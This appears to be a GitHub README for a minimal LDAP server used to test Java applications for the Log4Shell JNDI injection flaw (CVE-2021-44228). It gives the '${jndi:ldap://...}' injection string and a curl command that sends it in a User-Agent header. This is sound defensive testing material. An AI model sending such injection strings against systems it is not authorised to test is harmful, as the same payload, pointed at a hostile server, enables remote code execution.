[![Download](https://img.shields.io/github/v/release/rakutentech/jndi-ldap-test-server?color=green&label=Download%20Latest)](https://github.com/rakutentech/jndi-ldap-test-server/releases/latest)

# jndi-ldap-test-server

This is a minimalistic LDAP server that is meant for test vulnerability to
JNDI+LDAP injection attacks in Java, especially
[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

## How to test vulnerability to CVE-2021-44228

1. Download the test server binary for your platform (you can find all binaries
   under [Releases](https://github.com/rakutentech/jndi-ldap-test-server/releases)).
2. Run the test server on some IP address accessible by the application you want
   to test. It's the easiest if you can run the server on the same host as your
   app (localhost).
3. Find any untrusted externally provided that your application receives from
   the outside and logs.
4. Force your app to log a string that includes:
   ```
   ${jndi:ldap://localhost:1389/Test}
   ```
   Please replace `localhost` with your own servers' IP or domain name if you're
   not running the test server locally.

   For instance, if you are running an HTTP server which is logging the
   `User-Agent` HTTP header, you can test for vulnerability by calling this cURL
   command while the test server is running:
   ```bash
   curl my-host -H 'User-Agent: ${jndi:ldap://test-server-host:1389/Test}'
   ```
5. If your application is vulnerable, you should see an incoming connection on
   the test server, and the injected string will be replaced by the text `!!!
   VULNERABLE !!!` in your logs. If your application is not vulnerable, the
   injected string should not be substituted and the test server should not
   receive any connection.
